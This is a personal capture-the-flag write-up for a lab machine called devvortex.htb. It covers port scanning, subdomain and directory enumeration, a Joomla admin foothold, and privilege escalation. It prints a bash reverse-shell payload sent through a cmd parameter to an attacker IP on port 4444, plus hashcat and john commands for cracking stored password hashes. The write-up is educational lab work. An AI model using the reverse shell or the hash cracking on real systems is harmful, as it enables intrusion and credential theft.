## Room Information

## Tools Used

- Nmap
- wfuzz
- searchsploit
- gobuster
- hascat

## Port Scanning

Other room, other port scan.

```bash
map -p- -sS --open --min-rate 5000 -n -Pn -oG allPorts 10.10.11.242
```

```bash
nmap -p 22,80 -sCV --min-rate 5000-n -Pn -oN filtered 10.10.11.242
```

Showing this scan, we can say that the vulnerability 99% is inside the websiteâ€¦ So lest discover info of port 80.

 

## Enumeration

First I did was a subdomain enumeration to discard things, and I found one (dev.devvortex.htb)..

```bash
gobuster vhost -u devvortex.htb -w /usr/share/wordlists/dirbuster/dns/subdomains-top1million-5000.txt --append-domain -t 40 -k
```

other posibilitiâ€¦

```bash
ffuf -w /usr/share/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.devvortex.htb" -u http://devvortex.htb/ -mc 200-299
```

Then I did a directory enumeration to saw if the web contains something interesting. And I saw an administrator panel which was a loguin panel of a joomla database.

Also I discovered this file which contained the joomla version. So first I did since saw this was searching a bypass or something for this db. And I found a lot of them.

## Exploiting

I used search sploit for searching for exploits and I use this below:

Then I logged with the above credential and I had access to de db panel such as super userâ€¦

I found this post on hacktricks, and I followed the guide. Then I gain access to the machine as ww-data ðŸ‘¹

```bash
...?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.130/4444 0>&1'
```

## Escalating Privileges

Then I throw a [`linpeas.sh`](http://linpeas.sh) instance and I show that there was a db running on the backend.. And I logged in using the lewis db credentials I got at firstâ€¦

Then in the joomla db I found a table called ...._users that contained the ssh users and passwd hashed. So I start decoding them with hashcat and john:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

or 

```bash
hashcat -m 3200 -a 0 -w 4 hash /usr/share/wordlists/rockyou.txt
```
